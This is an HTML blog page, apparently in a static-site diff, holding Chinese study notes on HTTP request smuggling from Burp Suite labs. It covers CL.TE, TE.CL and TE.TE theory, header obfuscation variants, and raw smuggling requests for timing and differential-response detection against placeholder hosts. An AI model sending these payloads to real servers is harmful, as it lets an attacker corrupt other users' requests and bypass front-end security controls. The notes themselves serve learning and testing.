@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="bp实验室HTTP请求走私漏洞学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP请求走私漏洞学习">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/51504.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="bp实验室HTTP请求走私漏洞学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67dc12bc88c538a9b5c210b0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67dc28b088c538a9b5c21669.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67dc2fb688c538a9b5c2184d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67dc324088c538a9b5c218c0.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67dc344688c538a9b5c21917.png">
+<meta property="article:published_time" content="2025-03-20T12:59:07.000Z">
+<meta property="article:modified_time" content="2025-03-20T15:47:31.535Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67dc12bc88c538a9b5c210b0.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/51504.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HTTP请求走私漏洞学习 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">66</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/51504.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTTP请求走私漏洞学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-20 20:59:07 / 修改时间：23:47:31" itemprop="dateCreated datePublished" datetime="2025-03-20T20:59:07+08:00">2025-03-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67dc116688c538a9b5c2101c.png" class="img-topic">
+        </div>
+      
+      
+        <p>bp实验室HTTP请求走私漏洞学习笔记</p>
+<span id="more"></span>
+<h1 id="什么是http请求走私"><a href="#什么是http请求走私" class="headerlink" title="什么是http请求走私"></a>什么是http请求走私</h1><p>HTTP 请求走私是一种干扰网站处理从一个或多个用户收到的 HTTP 请求序列的方式的技术。请求走私漏洞通常性质严重，允许攻击者绕过安全控制、未经授权访问敏感数据并直接危害其他应用程序用户。<br>请求走私主要与 HTTP&#x2F;1 请求有关。但是，支持 HTTP&#x2F;2 的网站也可能存在漏洞，具体取决于其后端架构。<br>现在的web应用在用户和最终应用服务中有一个http链，就是用户通过前段发送请求，前端再把这个请求发送给一个或者多个后端，通常前端会向后端发送多个请求，因为这样效率更高。http的请求会一个接一个的发送，接受的服务器必须决定一个请求在哪里结束，下一个请求在哪里开始<br>所以后端和前端的请求之间的界限就要有明确规定，不然攻击者就可以用模糊的请求，让前端和后端处理请求不一样<br><img src="https://pic1.imgdb.cn/item/67dc12bc88c538a9b5c210b0.png"><br>这幅图就是一个例子，攻击者发送前端请求，让后端把一部分当作了下一个请求的开始，（橙色部分） ， 然后这部分就添加到了下一个请求上，这样就干扰了程序的正常请求，这就是一个走私攻击。</p>
+<h1 id="http请求走私如何出现的"><a href="#http请求走私如何出现的" class="headerlink" title="http请求走私如何出现的"></a>http请求走私如何出现的</h1><p>大多数 HTTP 请求走私漏洞的出现是因为 HTTP&#x2F;1 规范提供了两种不同的方式来指定请求的结束位置： <code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br><code>Content-Length标头很简单</code>：它指定消息正文的长度（以字节为单位）。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
+<p><code>Transfer-Encoding</code>标头可用于指定消息正文使用分块编码。这表示消息主体包含一个或多个数据块。每个数据块由数据块大小（以字节为单位）组成（以 十六进制），然后是换行符，然后是块内容。消息以大小为零的块结束。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-abnf">b</span></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br><span class="line"><span class="language-abnf"><span class="number">0</span></span></span><br></pre></td></tr></table></figure></div>
+<p>这个例子中，有两个数据块，一个数据块有11字节的大小(b) 内容是q&#x3D;smuggling，第二块大小为0 代表结束<br>浏览器通常不会在请求中使用分块编码，并且通常仅在服务器响应中看到它.</p>
+<p>因为HTTP&#x2F;1中有这两种指定http消息长度的方式，所以一条消息可能会同时用两种方式，从而造成冲突。<br>在规定中如果这两种方式同时出现，应该优先考虑<code>Transfer-Encoding</code>，但是这种方式只在仅有一台服务器的时候奏效，因为如果有多台服务器，可能有某些服务器不支持<code>Transfer-Encoding</code>，或者支持的服务器又被诱导不处理它，那就造成了前端和后端对<code>Transfer-Encoding</code>标头的处理不同，那么就可能对连续请求的边界存在歧义，从而造成请求走私漏洞</p>
+<p>————note<br>端到端使用 HTTP&#x2F;2 的网站本质上不受请求走私攻击的影响。由于 HTTP&#x2F;2 规范引入了一种用于指定请求长度的单一、强大的机制，因此攻击者无法引入所需的歧义。<br>然而，许多网站都有支持 HTTP&#x2F;2 的前端服务器，但将其部署在仅支持 HTTP&#x2F;1 的后端基础设施前面。这意味着前端必须有效地将收到的请求转换为 HTTP&#x2F;1。此过程称为 HTTP 降级。这就涉及到了高级http请求走私</p>
+<h1 id="如何执行http请求走私"><a href="#如何执行http请求走私" class="headerlink" title="如何执行http请求走私"></a>如何执行http请求走私</h1><p>通常是由<code>Transfer-Encoding</code> <code>Content-Length</code>标头放在同一个HTTP&#x2F;1请求中，对其进行操作，让前端和后端用不同的方式处理。具体由两个服务器的行为决定：</p>
+<ul>
+<li><code>CL.TE</code>：前端服务器使用Content-Length标头，后端服务器使用Transfer-Encoding标头。</li>
+<li><code>TE.CL</code>：前端服务器使用Transfer-Encoding标头，后端服务器使用Content-Length标头。</li>
+<li><code>TE.TE</code>：前端和后端服务器都支持Transfer-Encoding标头，但其中一个 可以通过某种方式混淆标头来诱导服务器不处理它。</li>
+</ul>
+<p>————note<br>这些方式只能用在HTTP&#x2F;1请求中，在测试支持HTTP2的站点中要在 Burp Repeater 中手动切换协议 从Inspector面板的Request 属性部分执行此操作。</p>
+<h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL.CL"></a>CL.CL</h2><p>服务器遇见一个请求中包含两个Content-Length时，应该返回400错误，但一些服务器可能不会严格执行该规范，此时就可能出现请求走私。<br>前端代理服务器和后端服务器在收到一个包含两个Content-Length的请求时，皆不返回400，且此时前端代理服务器采用的是第一个Content-Length，后端服务器采用的是第二个Content-Length<br>假如构造请求</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span><span class="string">\r\n</span></span><br><span class="line">Host: example.com<span class="string">\r\n</span></span><br><span class="line">Content-Length: <span class="number">8</span><span class="string">\r\n</span></span><br><span class="line">Content-Length: <span class="number">7</span><span class="string">\r\n</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345</span><span class="string">\r\n</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure></div>
+<p>根据CL的长度不同，还有a会发送到后端服务器中</p>
+<h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h2><p>前端用Content-Length 后端用 Transfer-Encoding<br>攻击示例</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure></div>
+<p>前端用Content-Length: 13发送请求，表示消息长度是13 也就是<code>0\r\n\r\nSMUGGLED</code><br>但是后端用Transfer-Encoding: chunked处理，它看到0之后就以为是结束，SMUGGLED消息就会被当作是下一个请求的开始</p>
+<h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h2><p>前端用Transfer-Encoding 后端用Content-Length</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure></div>
+<p>前端用Transfer-Encoding 后端用 Content-Length,这样后端在处理的时候，就处理到<code>8\r\n</code>这行，后面的没有给处理，会被当作下一个请求</p>
+<h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h2><p>在这里，前端和后端服务器都支持 Transfer-Encoding 标头，但其中一个服务器 可以通过以某种方式混淆 Headers 来诱导不处理它。<br>例如</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">Transfer-Encoding:</span> xchunked</span><br><span class="line"></span><br><span class="line"><span class="params">Transfer-Encoding :</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="params">Transfer-Encoding:</span> chunked</span><br><span class="line"><span class="params">Transfer-Encoding:</span> x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]<span class="params">Transfer-Encoding:</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="params">X:</span> X[\n]<span class="params">Transfer-Encoding:</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="params">Transfer-Encoding</span></span><br><span class="line"><span class="params">:</span> chunked</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>这些技术中的每一种都涉及与 HTTP 规范的细微差异。实现协议规范的实际代码很少以绝对精度遵守它，并且不同的实现通常会容忍与规范不同的变化。要发现 TE.TE 漏洞，必须找到 Transfer-Encoding 标头的一些变体，以便只有一个前端或后端服务器处理它，而 其他服务器会忽略它。<br>根据是前端服务器还是后端服务器可以被诱使不处理混淆的 Transfer-Encoding 标头，攻击的其余部分将采用与 CL.TE 或 TE 相同的形式。CL 漏洞。</p>
+<h1 id="如何识别"><a href="#如何识别" class="headerlink" title="如何识别"></a>如何识别</h1><p><img src="https://pic1.imgdb.cn/item/67dc28b088c538a9b5c21669.png"></p>
+<h2 id="使用计时技术查找-HTTP-请求走私漏洞"><a href="#使用计时技术查找-HTTP-请求走私漏洞" class="headerlink" title="使用计时技术查找 HTTP 请求走私漏洞"></a>使用计时技术查找 HTTP 请求走私漏洞</h2><h3 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>如果应用程序容易受到请求走私的 CL.TE 变体的攻击，则发送如下请求通常会导致时间延迟：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">1</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">A</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">X</span></span></span><br></pre></td></tr></table></figure></div>
+<p>由于前端服务器使用 Content-Length 标头，因此它只会转发此请求的一部分，省略 X。后端服务器使用 Transfer-Encoding 标头，处理第一个块，然后等待下一个块到达。这将导致可观察的时间延迟。</p>
+<h3 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">0</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">X</span></span></span><br></pre></td></tr></table></figure></div>
+<p>由于前端服务器使用 Transfer-Encoding 标头，因此它只会转发此请求的一部分，省略 X。后端服务器使用 Content-Length 标头，期望邮件正文中有更多的内容，并等待剩余内容到达。这将导致可观察的时间延迟。</p>
+<p>要注意的是，要先测试CL.TE 再测试TE.CL </p>
+<h2 id="使用差分响应确认-HTTP-请求走私漏洞"><a href="#使用差分响应确认-HTTP-请求走私漏洞" class="headerlink" title="使用差分响应确认 HTTP 请求走私漏洞"></a>使用差分响应确认 HTTP 请求走私漏洞</h2><h3 id="CL-TE-2"><a href="#CL-TE-2" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>当检测到可能的请求走私漏洞时，可以通过利用它来触发应用程序响应内容的差异，从而获得该漏洞的进一步证据。这涉及快速连续地向应用程序发送两个请求：</p>
+<ul>
+<li>旨在干扰下一个请求的处理的 “攻击” 请求。</li>
+<li>一个 “正常” 请求。<br>如果对正常请求的响应包含预期的干扰，则确认漏洞</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
+<p>此正常请求通常会收到状态代码为 200 的 HTTP 响应，其中包含一些搜索结果<br>要确认 CL.TE 漏洞 可以发送</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">e</span></span><br><span class="line"><span class="language-routeros"><span class="attribute">q</span>=smuggling&amp;x=</span></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /404 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Foo: x</span></span><br></pre></td></tr></table></figure></div>
+<p>如果攻击成功，则后端服务器会将此请求的最后两行视为属于收到的下一个请求。这将导致后续的 “normal” 请求如下所示：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
+<p>服务器将以状态代码 404 进行响应，这表明攻击请求确实干扰了它。 也就确认了CL.TE漏洞</p>
+<h3 id="TE-CL-2"><a href="#TE-CL-2" class="headerlink" title="TE.CL"></a>TE.CL</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">7</span>c</span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/404</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">144</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">x</span><span class="operator">=</span></span></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br></pre></td></tr></table></figure></div>
+<p>发送这个消息<br>—————note<br>要使用 Burp Repeater 发送此请求， 首先需要转到 Repeater 菜单并确保未选中“Update Content-Length”选项。<br>需要在最后的 0 后面包含尾随序列 \r\n\r\n。</p>
+<p>如果攻击成功，则后端服务器会将 GET &#x2F;404 之后的所有内容视为属于收到的下一个请求。这将导致后续的 “normal” 请求如下所示：</p>
